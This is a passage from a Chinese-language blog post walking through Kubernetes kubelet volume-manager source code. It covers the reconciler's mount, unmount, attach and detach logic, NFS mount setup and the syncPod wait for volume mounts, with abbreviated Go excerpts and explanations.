!runningPodsFetched { var getPodsErr error runningPods, getPodsErr = dswp.kubeContainerRuntime.GetPods(false) if getPodsErr != nil { klog.Errorf( \u0026#34;kubeContainerRuntime.findAndRemoveDeletedPods returned error %v.\u0026#34;, getPodsErr) continue } runningPodsFetched = true dswp.timeOfLastGetPodStatus = time.Now() } runningContainers := false for _, runningPod := range runningPods { if runningPod.ID == volumeToMount.Pod.UID { if len(runningPod.Containers) \u0026gt; 0 { runningContainers = true } break } } if runningContainers { klog.V(4).Infof( \u0026#34;Pod %q still has one or more containers in the non-exited state. Therefore, it will not be removed from desired state.\u0026#34;, format.Pod(volumeToMount.Pod)) continue } exists, _, _ := dswp.actualStateOfWorld.PodExistsInVolume(volumeToMount.PodName, volumeToMount.VolumeName) if !exists \u0026amp;\u0026amp; podExists { klog.V(4).Infof( volumeToMount.GenerateMsgDetailed(fmt.Sprintf(\u0026#34;Actual state has not yet has this volume mounted information and pod (%q) still exists in pod manager, skip removing volume from desired state\u0026#34;, format.Pod(volumeToMount.Pod)), \u0026#34;\u0026#34;)) continue } klog.V(4).Infof(volumeToMount.GenerateMsgDetailed(\u0026#34;Removing volume from desired state\u0026#34;, \u0026#34;\u0026#34;)) dswp.desiredStateOfWorld.DeletePodFromVolume( volumeToMount.PodName, volumeToMount.VolumeName) dswp.deleteProcessedPod(volumeToMount.PodName) } podsWithError := dswp.desiredStateOfWorld.GetPodsWithErrors() for _, podName := range podsWithError { if _, podExists := dswp.podManager.GetPodByUID(types.UID(podName)); !podExists { dswp.desiredStateOfWorld.PopPodErrors(podName) } } }   说明：\n  假如runningPodsFetched不存在，并不会立即马上删除卷信息记录。而是调用dswp.kubeContainerRuntime.GetPods(false)抓取Pod信息，这里是调用kubeContainerRuntime的GetPods函数。因此获取的都是runningPods信息，即正在运行的Pod信息。由于一个volume可以属于多个Pod，而一个Pod可以包含多个container，每个container都可以使用volume，所以他要扫描该volume所属的Pod的container信息，确保没有container使用该volume，才会删除该volume。\n  desiredStateOfWorld就构建出来了，这是理想的volume状态，这里并没有发生实际的volume的创建删除挂载卸载操作。实际的操作由reconciler.Run(sourcesReady, stopCh)完成。\n  reconciler reconciler 调谐器，即按desiredStateOfWorld来同步volume配置操作\n主要流程   通过定时任务定期同步，reconcile就是一致性函数，保存desired和actual状态一致。\n  reconcile首先从actualStateOfWorld获取已经挂载的volume信息，然后查看该volume是否存在于desiredStateOfWorld,假如不存在就卸载。\n  接着从desiredStateOfWorld获取需要挂载的volumes。与actualStateOfWorld比较，假如没有挂载，则进行挂载。\n  这样存储就可以加载到主机attach，并挂载到容器目录mount。\nfunc (rc *reconciler) Run(stopCh \u0026lt;-chan struct{}) { wait.Until(rc.reconciliationLoopFunc(), rc.loopSleepDuration, stopCh) } func (rc *reconciler) reconciliationLoopFunc() func() { return func() { rc.reconcile() // Sync the state with the reality once after all existing pods are added to the desired state from all sources.  // Otherwise, the reconstruct process may clean up pods\u0026#39; volumes that are still in use because  // desired state of world does not contain a complete list of pods.  if rc.populatorHasAddedPods() \u0026amp;\u0026amp; !rc.StatesHasBeenSynced() { klog.Infof(\u0026#34;Reconciler: start to sync state\u0026#34;) rc.sync() } } } func (rc *reconciler) reconcile() { // Unmounts are triggered before mounts so that a volume that was  // referenced by a pod that was deleted and is now referenced by another  // pod is unmounted from the first pod before being mounted to the new  // pod.  rc.unmountVolumes() // Next we mount required volumes. This function could also trigger  // attach if kubelet is responsible for attaching volumes.  // If underlying PVC was resized while in-use then this function also handles volume  // resizing.  rc.mountAttachVolumes() // Ensure devices that should be detached/unmounted are detached/unmounted.  rc.unmountDetachDevices() } func (rc *reconciler) unmountVolumes() { // Ensure volumes that should be unmounted are unmounted.  for _, mountedVolume := range rc.actualStateOfWorld.GetAllMountedVolumes() { if !rc.desiredStateOfWorld.PodExistsInVolume(mountedVolume.PodName, mountedVolume.VolumeName) { // Volume is mounted, unmount it  klog.V(5).Infof(mountedVolume.GenerateMsgDetailed(\u0026#34;Starting operationExecutor.UnmountVolume\u0026#34;, \u0026#34;\u0026#34;)) // 此处UnmountVolume会根据具体的unmounter调用 CleanupMountPoint -\u0026gt; doCleanupMountPoint ，进行挂载卸载和目录删除  // 这里可能会出现 对于挂载目录卸载失败的情况（社区有关孤儿pod的bug讨论），此时，kubelet的pod清理工作线程无法进行该挂载目录的直接删除  err := rc.operationExecutor.UnmountVolume( mountedVolume.MountedVolume, rc.actualStateOfWorld, rc.kubeletPodsDir) if err != nil \u0026amp;\u0026amp; !nestedpendingoperations.IsAlreadyExists(err) \u0026amp;\u0026amp; !exponentialbackoff.IsExponentialBackoff(err) { // Ignore nestedpendingoperations.IsAlreadyExists and exponentialbackoff.IsExponentialBackoff errors, they are expected.  // Log all other errors.  klog.Errorf(mountedVolume.GenerateErrorDetailed(fmt.Sprintf(\u0026#34;operationExecutor.UnmountVolume failed (controllerAttachDetachEnabled %v)\u0026#34;, rc.controllerAttachDetachEnabled), err).Error()) } if err == nil { klog.Infof(mountedVolume.GenerateMsgDetailed(\u0026#34;operationExecutor.UnmountVolume started\u0026#34;, \u0026#34;\u0026#34;)) } } } } func (rc *reconciler) mountAttachVolumes() { // Ensure volumes that should be attached/mounted are attached/mounted.  for _, volumeToMount := range rc.desiredStateOfWorld.GetVolumesToMount() { volMounted, devicePath, err := rc.actualStateOfWorld.PodExistsInVolume(volumeToMount.PodName, volumeToMount.VolumeName) volumeToMount.DevicePath = devicePath if cache.IsVolumeNotAttachedError(err) { if rc.controllerAttachDetachEnabled || !volumeToMount.PluginIsAttachable { // Volume is not attached (or doesn\u0026#39;t implement attacher), kubelet attach is disabled, wait  // for controller to finish attaching volume.  klog.V(5).Infof(volumeToMount.GenerateMsgDetailed(\u0026#34;Starting operationExecutor.VerifyControllerAttachedVolume\u0026#34;, \u0026#34;\u0026#34;)) err := rc.operationExecutor.VerifyControllerAttachedVolume( volumeToMount.VolumeToMount, rc.nodeName, rc.actualStateOfWorld) if err != nil \u0026amp;\u0026amp; !nestedpendingoperations.IsAlreadyExists(err) \u0026amp;\u0026amp; !exponentialbackoff.IsExponentialBackoff(err) { // Ignore nestedpendingoperations.IsAlreadyExists and exponentialbackoff.IsExponentialBackoff errors, they are expected.  // Log all other errors.  klog.Errorf(volumeToMount.GenerateErrorDetailed(fmt.Sprintf(\u0026#34;operationExecutor.VerifyControllerAttachedVolume failed (controllerAttachDetachEnabled %v)\u0026#34;, rc.controllerAttachDetachEnabled), err).Error()) } if err == nil { klog.Infof(volumeToMount.GenerateMsgDetailed(\u0026#34;operationExecutor.VerifyControllerAttachedVolume started\u0026#34;, \u0026#34;\u0026#34;)) } } else { // Volume is not attached to node, kubelet attach is enabled, volume implements an attacher,  // so attach it  volumeToAttach := operationexecutor.VolumeToAttach{ VolumeName: volumeToMount.VolumeName, VolumeSpec: volumeToMount.VolumeSpec, NodeName: rc.nodeName, } klog.V(5).Infof(volumeToAttach.GenerateMsgDetailed(\u0026#34;Starting operationExecutor.AttachVolume\u0026#34;, \u0026#34;\u0026#34;)) err := rc.operationExecutor.AttachVolume(volumeToAttach, rc.actualStateOfWorld) if err != nil \u0026amp;\u0026amp; !nestedpendingoperations.IsAlreadyExists(err) \u0026amp;\u0026amp; !exponentialbackoff.IsExponentialBackoff(err) { // Ignore nestedpendingoperations.IsAlreadyExists and exponentialbackoff.IsExponentialBackoff errors, they are expected.  // Log all other errors.  klog.Errorf(volumeToMount.GenerateErrorDetailed(fmt.Sprintf(\u0026#34;operationExecutor.AttachVolume failed (controllerAttachDetachEnabled %v)\u0026#34;, rc.controllerAttachDetachEnabled), err).Error()) } if err == nil { klog.Infof(volumeToMount.GenerateMsgDetailed(\u0026#34;operationExecutor.AttachVolume started\u0026#34;, \u0026#34;\u0026#34;)) } } } else if !volMounted || cache.IsRemountRequiredError(err) { // Volume is not mounted, or is already mounted, but requires remounting  remountingLogStr := \u0026#34;\u0026#34; isRemount := cache.IsRemountRequiredError(err) if isRemount { remountingLogStr = \u0026#34;Volume is already mounted to pod, but remount was requested.\u0026#34; } klog.V(4).Infof(volumeToMount.GenerateMsgDetailed(\u0026#34;Starting operationExecutor.MountVolume\u0026#34;, remountingLogStr)) err := rc.operationExecutor.MountVolume( rc.waitForAttachTimeout, volumeToMount.VolumeToMount, rc.actualStateOfWorld, isRemount) if err != nil \u0026amp;\u0026amp; !nestedpendingoperations.IsAlreadyExists(err) \u0026amp;\u0026amp; !exponentialbackoff.IsExponentialBackoff(err) { // Ignore nestedpendingoperations.IsAlreadyExists and exponentialbackoff.IsExponentialBackoff errors, they are expected.  // Log all other errors.  klog.Errorf(volumeToMount.GenerateErrorDetailed(fmt.Sprintf(\u0026#34;operationExecutor.MountVolume failed (controllerAttachDetachEnabled %v)\u0026#34;, rc.controllerAttachDetachEnabled), err).Error()) } if err == nil { if remountingLogStr == \u0026#34;\u0026#34; { klog.V(1).Infof(volumeToMount.GenerateMsgDetailed(\u0026#34;operationExecutor.MountVolume started\u0026#34;, remountingLogStr)) } else { klog.V(5).Infof(volumeToMount.GenerateMsgDetailed(\u0026#34;operationExecutor.MountVolume started\u0026#34;, remountingLogStr)) } } } else if cache.IsFSResizeRequiredError(err) \u0026amp;\u0026amp; utilfeature.DefaultFeatureGate.Enabled(features.ExpandInUsePersistentVolumes) { klog.V(4).Infof(volumeToMount.GenerateMsgDetailed(\u0026#34;Starting operationExecutor.ExpandInUseVolume\u0026#34;, \u0026#34;\u0026#34;)) err := rc.operationExecutor.ExpandInUseVolume( volumeToMount.VolumeToMount, rc.actualStateOfWorld) if err != nil \u0026amp;\u0026amp; !nestedpendingoperations.IsAlreadyExists(err) \u0026amp;\u0026amp; !exponentialbackoff.IsExponentialBackoff(err) { // Ignore nestedpendingoperations.IsAlreadyExists and exponentialbackoff.IsExponentialBackoff errors, they are expected.  // Log all other errors.  klog.Errorf(volumeToMount.GenerateErrorDetailed(\u0026#34;operationExecutor.ExpandInUseVolume failed\u0026#34;, err).Error()) } if err == nil { klog.V(4).Infof(volumeToMount.GenerateMsgDetailed(\u0026#34;operationExecutor.ExpandInUseVolume started\u0026#34;, \u0026#34;\u0026#34;)) } } } } func (rc *reconciler) unmountDetachDevices() { for _, attachedVolume := range rc.actualStateOfWorld.GetUnmountedVolumes() { // Check IsOperationPending to avoid marking a volume as detached if it\u0026#39;s in the process of mounting.  if !rc.desiredStateOfWorld.VolumeExists(attachedVolume.VolumeName) \u0026amp;\u0026amp; !rc.operationExecutor.IsOperationPending(attachedVolume.VolumeName, nestedpendingoperations.EmptyUniquePodName, nestedpendingoperations.EmptyNodeName) { if attachedVolume.DeviceMayBeMounted() { // Volume is globally mounted to device, unmount it  klog.V(5).Infof(attachedVolume.GenerateMsgDetailed(\u0026#34;Starting operationExecutor.UnmountDevice\u0026#34;, \u0026#34;\u0026#34;)) err := rc.operationExecutor.UnmountDevice( attachedVolume.AttachedVolume, rc.actualStateOfWorld, rc.hostutil) if err != nil \u0026amp;\u0026amp; !nestedpendingoperations.IsAlreadyExists(err) \u0026amp;\u0026amp; !exponentialbackoff.IsExponentialBackoff(err) { // Ignore nestedpendingoperations.IsAlreadyExists and exponentialbackoff.IsExponentialBackoff errors, they are expected.  // Log all other errors.  klog.Errorf(attachedVolume.GenerateErrorDetailed(fmt.Sprintf(\u0026#34;operationExecutor.UnmountDevice failed (controllerAttachDetachEnabled %v)\u0026#34;, rc.controllerAttachDetachEnabled), err).Error()) } if err == nil { klog.Infof(attachedVolume.GenerateMsgDetailed(\u0026#34;operationExecutor.UnmountDevice started\u0026#34;, \u0026#34;\u0026#34;)) } } else { // Volume is attached to node, detach it  // Kubelet not responsible for detaching or this volume has a non-attachable volume plugin.  if rc.controllerAttachDetachEnabled || !attachedVolume.PluginIsAttachable { rc.actualStateOfWorld.MarkVolumeAsDetached(attachedVolume.VolumeName, attachedVolume.NodeName) klog.Infof(attachedVolume.GenerateMsgDetailed(\u0026#34;Volume detached\u0026#34;, fmt.Sprintf(\u0026#34;DevicePath %q\u0026#34;, attachedVolume.DevicePath))) } else { // Only detach if kubelet detach is enabled  klog.V(5).Infof(attachedVolume.GenerateMsgDetailed(\u0026#34;Starting operationExecutor.DetachVolume\u0026#34;, \u0026#34;\u0026#34;)) err := rc.operationExecutor.DetachVolume( attachedVolume.AttachedVolume, false /* verifySafeToDetach */, rc.actualStateOfWorld) if err != nil \u0026amp;\u0026amp; !nestedpendingoperations.IsAlreadyExists(err) \u0026amp;\u0026amp; !exponentialbackoff.IsExponentialBackoff(err) { // Ignore nestedpendingoperations.IsAlreadyExists \u0026amp;\u0026amp; exponentialbackoff.IsExponentialBackoff errors, they are expected.  // Log all other errors.  klog.Errorf(attachedVolume.GenerateErrorDetailed(fmt.Sprintf(\u0026#34;operationExecutor.DetachVolume failed (controllerAttachDetachEnabled %v)\u0026#34;, rc.controllerAttachDetachEnabled), err).Error()) } if err == nil { klog.Infof(attachedVolume.GenerateMsgDetailed(\u0026#34;operationExecutor.DetachVolume started\u0026#34;, \u0026#34;\u0026#34;)) } } } } } } // sync process tries to observe the real world by scanning all pods\u0026#39; volume directories from the disk. // If the actual and desired state of worlds are not consistent with the observed world, it means that some // mounted volumes are left out probably during kubelet restart. This process will reconstruct // the volumes and update the actual and desired states. For the volumes that cannot support reconstruction, // it will try to clean up the mount paths with operation executor. func (rc *reconciler) sync() { defer rc.updateLastSyncTime() rc.syncStates() }   CleanupMountPoint -\u0026gt; doCleanupMountPoint 具体volume卸载操作\n 如果是挂载点，则先卸载mounter.Unmount(mountPath) os.Remove(mountPath)  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  // CleanupMountPoint unmounts the given path and deletes the remaining directory // if successful. If extensiveMountPointCheck is true IsNotMountPoint will be // called instead of IsLikelyNotMountPoint. IsNotMountPoint is more expensive // but properly handles bind mounts within the same fs. func CleanupMountPoint(mountPath string, mounter Interface, extensiveMountPointCheck bool) error { pathExists, pathErr := PathExists(mountPath) if !pathExists { klog.Warningf(\u0026#34;Warning: Unmount skipped because path does not exist: %v\u0026#34;, mountPath) return nil } corruptedMnt := IsCorruptedMnt(pathErr) if pathErr != nil \u0026amp;\u0026amp; !corruptedMnt { return fmt.Errorf(\u0026#34;Error checking path: %v\u0026#34;, pathErr) } return doCleanupMountPoint(mountPath, mounter, extensiveMountPointCheck, corruptedMnt) } // doCleanupMountPoint unmounts the given path and // deletes the remaining directory if successful. // if extensiveMountPointCheck is true // IsNotMountPoint will be called instead of IsLikelyNotMountPoint. // IsNotMountPoint is more expensive but properly handles bind mounts within the same fs. // if corruptedMnt is true, it means that the mountPath is a corrupted mountpoint, and the mount point check // will be skipped func doCleanupMountPoint(mountPath string, mounter Interface, extensiveMountPointCheck bool, corruptedMnt bool) error { var notMnt bool var err error if !corruptedMnt { if extensiveMountPointCheck { notMnt, err = IsNotMountPoint(mounter, mountPath) } else { notMnt, err = mounter.IsLikelyNotMountPoint(mountPath) } if err != nil { return err } if notMnt { klog.Warningf(\u0026#34;Warning: %q is not a mountpoint, deleting\u0026#34;, mountPath) return os.Remove(mountPath) } } // Unmount the mount path klog.V(4).Infof(\u0026#34;%q is a mountpoint, unmounting\u0026#34;, mountPath) if err := mounter.Unmount(mountPath); err != nil { return err } if extensiveMountPointCheck { notMnt, err = IsNotMountPoint(mounter, mountPath) } else { notMnt, err = mounter.IsLikelyNotMountPoint(mountPath) } if err != nil { return err } if notMnt { klog.V(4).Infof(\u0026#34;%q is unmounted, deleting the directory\u0026#34;, mountPath) return os.Remove(mountPath) } return fmt.Errorf(\u0026#34;Failed to unmount path %v\u0026#34;, mountPath) }   mountVolumeFunc 执行plugin的SetUp方法，以及更新actual state of world\npendingOperations   根据pendingOperations: nestedpendingoperations.NewNestedPendingOperations，nestedPendingOperations实现了NestedPendingOperations接口，包括Run方法\n  路径 pkg/volume/util/nestedpendingoperations/nestedpendingoperations.go\n  mountAttachVolumes 处理分支：\n Volume is not attached (or doesn\u0026rsquo;t implement attacher), kubelet attach is disabled, wait for controller to finish attaching volume. Volume is not attached to node, kubelet attach is enabled, volume implements an attacher, so attach it Volume is not mounted, or is already mounted, but requires remounting  MountVolume 对于文件系统卷类型，operationGenerator.GenerateMountVolumeFunc(waitForAttachTimeout, volumeToMount, actualStateOfWorld) 具体挂载操作 GenerateMountVolumeFunc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124  func (oe *operationExecutor) MountVolume( waitForAttachTimeout time.Duration, volumeToMount VolumeToMount, actualStateOfWorld ActualStateOfWorldMounterUpdater, isRemount bool) error { fsVolume, err := util.CheckVolumeModeFilesystem(volumeToMount.VolumeSpec) if err != nil { return err } var generatedOperations volumetypes.GeneratedOperations if fsVolume { // Filesystem volume case  // Mount/remount a volume when a volume is attached  generatedOperations = oe.operationGenerator.GenerateMountVolumeFunc( waitForAttachTimeout, volumeToMount, actualStateOfWorld, isRemount) } else { // Block volume case  // Creates a map to device if a volume is attached  generatedOperations, err = oe.operationGenerator.GenerateMapVolumeFunc( waitForAttachTimeout, volumeToMount, actualStateOfWorld) } if err != nil { return err } // Avoid executing mount/map from multiple pods referencing the  // same volume in parallel  podName := nestedpendingoperations.EmptyUniquePodName // TODO: remove this -- not necessary  if !volumeToMount.PluginIsAttachable \u0026amp;\u0026amp; !volumeToMount.PluginIsDeviceMountable { // volume plugins which are Non-attachable and Non-deviceMountable can execute mount for multiple pods  // referencing the same volume in parallel  podName = util.GetUniquePodName(volumeToMount.Pod) } // TODO mount_device  return oe.pendingOperations.Run( volumeToMount.VolumeName, podName, \u0026#34;\u0026#34; /* nodeName */, generatedOperations) } // 挂载操作函数 func (og *operationGenerator) GenerateMountVolumeFunc( waitForAttachTimeout time.Duration, volumeToMount VolumeToMount, actualStateOfWorld ActualStateOfWorldMounterUpdater, isRemount bool) volumetypes.GeneratedOperations { // .......  mountVolumeFunc := func() (error, error) { // Get mounter plugin  volumePlugin, err := og.volumePluginMgr.FindPluginBySpec(volumeToMount.VolumeSpec) if err != nil || volumePlugin == nil { return volumeToMount.GenerateError(\u0026#34;MountVolume.FindPluginBySpec failed\u0026#34;, err) } affinityErr := checkNodeAffinity(og, volumeToMount) if affinityErr != nil { return volumeToMount.GenerateError(\u0026#34;MountVolume.NodeAffinity check failed\u0026#34;, affinityErr) } volumeMounter, newMounterErr := volumePlugin.NewMounter( volumeToMount.VolumeSpec, volumeToMount.Pod, volume.VolumeOptions{}) // get deviceMounter, if possible  deviceMountableVolumePlugin, _ := og.volumePluginMgr.FindDeviceMountablePluginBySpec(volumeToMount.VolumeSpec) if volumeDeviceMounter != nil{ // Mount device to global mount path  err = volumeDeviceMounter.MountDevice( volumeToMount.VolumeSpec, devicePath, deviceMountPath) } // SetUp prepares and mounts/unpacks the volume to a  // self-determined directory path. The mount point and its  // content should be owned by `fsUser` or \u0026#39;fsGroup\u0026#39; so that it can be  // accessed by the pod. This may be called more than once, so  // implementations must be idempotent.  // It could return following types of errors:  // - TransientOperationFailure  // - UncertainProgressError  // - Error of any other type should be considered a final error  // Execute mount  mountErr := volumeMounter.SetUp(volume.MounterArgs{ FsUser: util.FsUserFrom(volumeToMount.Pod), FsGroup: fsGroup, DesiredSize: volumeToMount.DesiredSizeLimit, FSGroupChangePolicy: fsGroupChangePolicy, }) // Update actual state of world  markOpts := MarkVolumeOpts{ PodName: volumeToMount.PodName, PodUID: volumeToMount.Pod.UID, VolumeName: volumeToMount.VolumeName, Mounter: volumeMounter, OuterVolumeSpecName: volumeToMount.OuterVolumeSpecName, VolumeGidVolume: volumeToMount.VolumeGidValue, VolumeSpec: volumeToMount.VolumeSpec, VolumeMountState: VolumeMounted, } // MarkVolumeAsMounted实际上更新了attachedVolumes[volumeName].mountedPods，卷的挂载信息：  // podObj.volumeMountStateForPod = markVolumeOpts.VolumeMountState  // asw.attachedVolumes[volumeName].mountedPods[podName] = podObj  markVolMountedErr := actualStateOfWorld.MarkVolumeAsMounted(markOpts) } // .......  // .......  }   NFS的mount setup  挂载命令默认使用了系统命令mount nfs中为每个volume的挂载目录路径的pluginName是kubernetes.io~nfs mount操作的source为nfs server 的 exportPath mount操作的target为dir，即pod的nfs卷路径位置nfsMounter.GetPath()，示例见下  1 2  source := fmt.Sprintf(\u0026#34;%s:%s\u0026#34;, nfsMounter.server, nfsMounter.exportPath) err = nfsMounter.mounter.MountSensitiveWithoutSystemd(source, dir, \u0026#34;nfs\u0026#34;, mountOptions, nil)   nfs的挂载volume路径dir示例： var/lib/kubelet/pods/{podid}//volumes/{pluginName}/{pvname}\n1 2 3  # nfsMounter.GetPath() #/var/lib/kubelet/pods/{podid}//volumes/{pluginName}/{pvname} /var/lib/kubelet/pods/06d10daa-c7e8-46e5-b94a-c0fcd2f27a2e/volumes/kubernetes.io~nfs/pvc-1f9f7ceb-6ca8-453e-87a0-013e53841fad   mount挂载处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107  // SetUp attaches the disk and bind mounts to the volume path. func (nfsMounter *nfsMounter) SetUp(mounterArgs volume.MounterArgs) error { return nfsMounter.SetUpAt(nfsMounter.GetPath(), mounterArgs) } func (nfsMounter *nfsMounter) SetUpAt(dir string, mounterArgs volume.MounterArgs) error { notMnt, err := mount.IsNotMountPoint(nfsMounter.mounter, dir) klog.V(4).Infof(\u0026#34;NFS mount set up: %s %v %v\u0026#34;, dir, !notMnt, err) if err != nil \u0026amp;\u0026amp; !os.IsNotExist(err) { return err } if !notMnt { return nil } if err := os.MkdirAll(dir, 0750); err != nil { return err } source := fmt.Sprintf(\u0026#34;%s:%s\u0026#34;, nfsMounter.server, nfsMounter.exportPath) options := []string{} if nfsMounter.readOnly { options = append(options, \u0026#34;ro\u0026#34;) } mountOptions := util.JoinMountOptions(nfsMounter.mountOptions, options) err = nfsMounter.mounter.MountSensitiveWithoutSystemd(source, dir, \u0026#34;nfs\u0026#34;, mountOptions, nil) if err != nil { notMnt, mntErr := mount.IsNotMountPoint(nfsMounter.mounter, dir) if mntErr != nil { klog.Errorf(\u0026#34;IsNotMountPoint check failed: %v\u0026#34;, mntErr) return err } if !notMnt { if mntErr = nfsMounter.mounter.Unmount(dir); mntErr != nil { klog.Errorf(\u0026#34;Failed to unmount: %v\u0026#34;, mntErr) return err } notMnt, mntErr := mount.IsNotMountPoint(nfsMounter.mounter, dir) if mntErr != nil { klog.Errorf(\u0026#34;IsNotMountPoint check failed: %v\u0026#34;, mntErr) return err } if !notMnt { // This is very odd, we don\u0026#39;t expect it. We\u0026#39;ll try again next sync loop.  klog.Errorf(\u0026#34;%s is still mounted, despite call to unmount(). Will try again next sync loop.\u0026#34;, dir) return err } } os.Remove(dir) return err } return nil } func (plugin *nfsPlugin) newMounterInternal(spec *volume.Spec, pod *v1.Pod, mounter mount.Interface) (volume.Mounter, error) { source, readOnly, err := getVolumeSource(spec) if err != nil { return nil, err } return \u0026amp;nfsMounter{ nfs: \u0026amp;nfs{ volName: spec.Name(), mounter: mounter, pod: pod, plugin: plugin, MetricsProvider: volume.NewMetricsStatFS(getPath(pod.UID, spec.Name(), plugin.host)), }, server: source.Server, exportPath: source.Path, readOnly: readOnly, mountOptions: util.MountOptionFromSpec(spec), }, nil } // Name returns the name of either Volume or PersistentVolume, one of which must not be nil. func (spec *Spec) Name() string { switch { case spec.Volume != nil: return spec.Volume.Name case spec.PersistentVolume != nil: return spec.PersistentVolume.Name default: return \u0026#34;\u0026#34; } } // NFS volumes represent a bare host file or directory mount of an NFS export. type nfs struct { volName string pod *v1.Pod mounter mount.Interface plugin *nfsPlugin volume.MetricsProvider } func (nfsVolume *nfs) GetPath() string { name := nfsPluginName // GetPodVolumeDir returns the absolute path a directory which  // represents the named volume under the named plugin for the given  // pod. If the specified pod does not exist, the result of this call  // might not exist.  return nfsVolume.plugin.host.GetPodVolumeDir(nfsVolume.pod.UID, utilstrings.EscapeQualifiedName(name), nfsVolume.volName) }   Kueblet SyncPod SyncPod上下文  这里先回顾下pod容器创建准备过程，粗体标注为volume相关的处理。\n 完成创建容器前的准备工作（SyncPod） 在这个方法中，主要完成以下几件事情：\n 如果是删除 pod，立即执行并返回 同步 podStatus 到 kubelet.statusManager 检查 pod 是否能运行在本节点，主要是权限检查（是否能使用主机网络模式，是否可以以 privileged 权限运行等）。如果没有权限，就删除本地旧的 pod 并返回错误信息 创建 containerManagar 对象，并且创建 pod level cgroup，更新 Qos level cgroup 如果是 static Pod，就创建或者更新对应的 mirrorPod 创建 pod 的数据目录，存放 volume 和 plugin 信息,如果定义了 pv，等待所有的 volume mount 完成（volumeManager 会在后台做这些事情）,如果有 image secrets，去 apiserver 获取对应的 secrets 数据 然后调用 kubelet.volumeManager 组件，等待它将 pod 所需要的所有外挂的 volume 都准备好。 调用 container runtime 的 SyncPod 方法，去实现真正的容器创建逻辑 这里所有的事情都和具体的容器没有关系，可以看到该方法是创建 pod 实体（即容器）之前需要完成的准备工作。  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  func (kl *Kubelet) syncPod(o syncPodOptions) error { // pull out the required options  pod := o.pod mirrorPod := o.mirrorPod podStatus := o.podStatus updateType := o.updateType // 是否为 删除 pod  if updateType == kubetypes.SyncPodKill { ... } ... // 检查 pod 是否能运行在本节点  runnable := kl.canRunPod(pod) if !runnable.Admit { ... } // 更新 pod 状态  kl.statusManager.SetPodStatus(pod, apiPodStatus) // 如果 pod 非 running 状态则直接 kill 掉  if !runnable.Admit || pod.DeletionTimestamp != nil || apiPodStatus.Phase == v1.PodFailed { ... } // 加载网络插件  if rs := kl.runtimeState.networkErrors(); len(rs) != 0 \u0026amp;\u0026amp; !kubecontainer.IsHostNetworkPod(pod) { ... } pcm := kl.containerManager.NewPodContainerManager() if !kl.podIsTerminated(pod) { ... // 创建并更新 pod 的 cgroups  if !(podKilled \u0026amp;\u0026amp; pod.Spec.RestartPolicy == v1.RestartPolicyNever) { if !pcm.Exists(pod) { ... } } } // 为 static pod 创建对应的 mirror pod  if kubepod.IsStaticPod(pod) { ... } // 创建数据目录  if err := kl.makePodDataDirs(pod); err != nil { ... } // 挂载 volume  if !kl.podIsTerminated(pod) { if err := kl.volumeManager.WaitForAttachAndMount(pod); err != nil { ... } } // 获取 secret 信息  pullSecrets := kl.getPullSecretsForPod(pod) // 调用 containerRuntime 的 SyncPod 方法开始创建容器  result := kl.containerRuntime.SyncPod(pod, apiPodStatus, podStatus, pullSecrets, kl.backOff) kl.reasonCache.Update(pod.UID, result) if err := result.Error(); err != nil { ... } return nil }   在上面的上下文中，看到了kubelet的syncpod处理，同步 pod 时，等待 pod attach 和 mount 完成\n1 2 3 4 5 6 7 8  func (kl *Kubelet) syncPod(o syncPodOptions) error { // 挂载 volume  if !kl.podIsTerminated(pod) { if err := kl.volumeManager.WaitForAttachAndMount(pod); err != nil { ... } } }   WaitForAttachAndMount 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  func (vm *volumeManager) WaitForAttachAndMount(pod *v1.Pod) error { if pod == nil { return nil } // pod的全部挂载卷  expectedVolumes := getExpectedVolumes(pod) if len(expectedVolumes) == 0 { // No volumes to verify  return nil } klog.V(3).Infof(\u0026#34;Waiting for volumes to attach and mount for pod %q\u0026#34;, format.Pod(pod)) uniquePodName := util.GetUniquePodName(pod) // Some pods expect to have Setup called over and over again to update.  // Remount plugins for which this is true. (Atomically updating volumes,  // like Downward API, depend on this to update the contents of the volume).  vm.desiredStateOfWorldPopulator.ReprocessPod(uniquePodName) err := wait.PollImmediate( podAttachAndMountRetryInterval, podAttachAndMountTimeout, vm.verifyVolumesMountedFunc(uniquePodName, expectedVolumes)) if err != nil { unmountedVolumes := vm.getUnmountedVolumes(uniquePodName, expectedVolumes) // Also get unattached volumes for error message  unattachedVolumes := vm.getUnattachedVolumes(expectedVolumes) // 没有被 mount 的volume 数量为0，表示成功完成挂载  if len(unmountedVolumes) == 0 { return nil } return fmt.Errorf( \u0026#34;unmounted volumes=%v, unattached volumes=%v: %s\u0026#34;, unmountedVolumes, unattachedVolumes, err) } klog.V(3).Infof(\u0026#34;All volumes are attached and mounted for pod %q\u0026#34;, format.Pod(pod)) return nil }   verifyVolumesMountedFunc  没有被 mount 的volume 数量为0，表示成功完成挂载 UnmountedVolumes = expectedVolumes - mountedVolumes  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // verifyVolumesMountedFunc returns a method that returns true when all expected // volumes are mounted. func (vm *volumeManager) 